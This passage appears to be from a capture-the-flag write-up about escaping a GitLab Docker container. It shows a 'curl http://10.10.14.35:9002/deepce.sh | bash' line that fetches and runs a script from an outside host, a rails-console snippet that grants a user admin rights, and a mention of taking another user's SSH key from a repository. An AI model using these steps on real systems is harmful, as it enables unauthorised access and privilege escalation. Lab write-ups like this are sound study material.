This is a docker container 
```bash
git@git:~/gitlab-rails/working$ ls -la /
ls -la /
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Apr 25 01:56 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
drwxr-xr-x   2 root root 4096 Apr 12  2016 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Feb 12  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 12  2020 media
drwxr-xr-x   2 root root 4096 Feb 12  2020 mnt
drwxr-xr-x   1 root root 4096 Feb 24  2020 opt
dr-xr-xr-x 328 root root    0 Apr 25 01:56 proc
drwx------   1 root root 4096 Jul 17  2020 root
drwxr-xr-x   1 root root 4096 Apr 25 01:56 run
drwxr-xr-x   1 root root 4096 Feb 21  2020 sbin
drwxr-xr-x   2 root root 4096 Feb 12  2020 srv
dr-xr-xr-x  13 root root    0 Apr 25 01:56 sys
drwxrwxrwt   1 root root 4096 Apr 25 08:47 tmp
drwxr-xr-x   1 root root 4096 Feb 12  2020 usr
drwxr-xr-x   1 root root 4096 Feb 12  2020 var

```

We use `deepce` [script](https://github.com/stealthcopter/deepce) to enumerate the docker container

```bash
curl http://10.10.14.35:9002/deepce.sh | bash
```
but nothing interesting shown up

## Get root on the container
We should try to manually enumerate the gitlab application.
Since we literally owner of the gitlab process, we can make an admin user, and enumerate the git server from that.

Open the console from inside the container
```bash
gitlab-rails console
```

### Switch our account into admin privilege
From the console
```ruby
u = User.find_by_username('wayne')
u.admin = true
u.save
```

![](Screen-shot/Get%20admin%20on%20gitlab.png)

Examine `dexter` repo, we find his ssh key
![](Screen-shot/Dexter%20ssh%20key.png)

And we got the shell on the machine itself
![](Screen-shot/SSH%20as%20dexter.png)